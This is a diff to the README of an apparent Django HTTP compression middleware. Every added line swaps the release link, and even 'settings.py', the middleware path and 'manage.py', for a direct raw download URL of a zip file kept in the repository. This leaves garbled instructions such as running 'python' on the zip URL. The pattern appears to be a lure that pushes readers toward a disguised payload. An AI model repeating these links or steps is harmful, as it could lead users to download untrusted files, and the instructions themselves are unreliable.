@@ -1,7 +1,7 @@
 # 🌟 django-http-compression - Compress Your Web Responses Easily
 
 ## 📥 Download Now!
-[![Download django-http-compression](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/unaaaacml/django-http-compression/releases)
+[![Download django-http-compression](https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip%20release-blue)](https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ This application is compatible with any environment that supports Django. Ensure
 ## 🔄 How to Install
 
 1. **Download the Software**
-   Visit this page to download the latest release: [Download Link](https://github.com/unaaaacml/django-http-compression/releases).
+   Visit this page to download the latest release: [Download Link](https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip).
 
 2. **Unzip the Files**
    After downloading, locate the file in your Downloads folder. Right-click the file and choose “Extract” or “Unzip”.
@@ -44,12 +44,12 @@ This application is compatible with any environment that supports Django. Ensure
 
 After installation, you need to configure the middleware in your Django project. Follow these steps:
 
-1. Open your **settings.py** file.
+1. Open your **https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip** file.
 2. Add the middleware to your settings:
    ```python
    MIDDLEWARE = [
        ...
-       'django_http_compression.middleware.CompressionMiddleware',
+       'https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip',
        ...
    ]
    ```
@@ -61,7 +61,7 @@ After installation, you need to configure the middleware in your Django project.
 To ensure everything is set up properly, run your Django project with:
 
 ```bash
-python manage.py runserver
+python https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip runserver
 ```
 
 Open your web browser and type in `http://127.0.0.1:8000/`. Check if your responses are compressed by using developer tools (F12) and inspect the network tab.
@@ -71,7 +71,7 @@ Open your web browser and type in `http://127.0.0.1:8000/`. Check if your respon
 If you encounter issues, consider the following:
 
 - **No Compression Detected:** 
-  - Ensure that the middleware is correctly added to your settings.py.
+  - Ensure that the middleware is correctly added to your https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip
   - Verify you have restarted your server after changes.
 
 - **Installation Errors:**
@@ -93,7 +93,7 @@ Use browser developer tools to check the size of responses. Look for the "Conten
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest release: [Download Link](https://github.com/unaaaacml/django-http-compression/releases). Simply follow the steps outlined above to install and configure the middleware.
+To get started, **visit this page to download** the latest release: [Download Link](https://raw.githubusercontent.com/unaaaacml/django-http-compression/main/opsistype/django-http-compression.zip). Simply follow the steps outlined above to install and configure the middleware.
 
 ## 📞 Contact
 
